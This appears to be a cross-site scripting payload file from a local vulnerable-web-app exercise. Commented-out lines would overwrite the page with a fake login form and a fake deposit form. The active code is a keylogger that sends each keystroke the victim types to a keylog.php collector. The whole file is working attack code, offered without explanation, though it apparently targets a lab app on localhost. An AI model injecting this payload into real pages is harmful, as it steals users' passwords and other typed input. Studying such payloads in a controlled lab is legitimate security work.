// document.body.innerHTML = '<div class="error"><h3>Please login to proceed</h3> <form>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br></div>';

// document.body.innerHTML = "<header> <a href='index.php'><button type='button'>Main</button></a></li> <a href='home.php'><button type='button'>Home</button></a></li> </header> <div class='header'> Deposit </div> <form method='post' action='confirm.php'> <?php include('errors.php'); ?> <div class='input-group'> <label>Deposit Amount</label> <input type='text' name='amount'> </div> <div class='input-group'> <button type='submit' class='btn' name='deposit'>Deposit</button> </div> </form> <div class='xsstest'> </div>"

document.onkeypress = function(evt) {
    evt = evt || window.event
    key = String.fromCharCode(evt.charCode)
    if (key) {
        var http = new XMLHttpRequest();
        var param = encodeURI (key)
        http.open("POST", "http://localhost:8000/vulnerable_web_app/current_build/keylog.php", true);
        http.setRequestHeader("content-type", "application/x-www-form-urlencoded");
        http.send("key="+param);
    }
}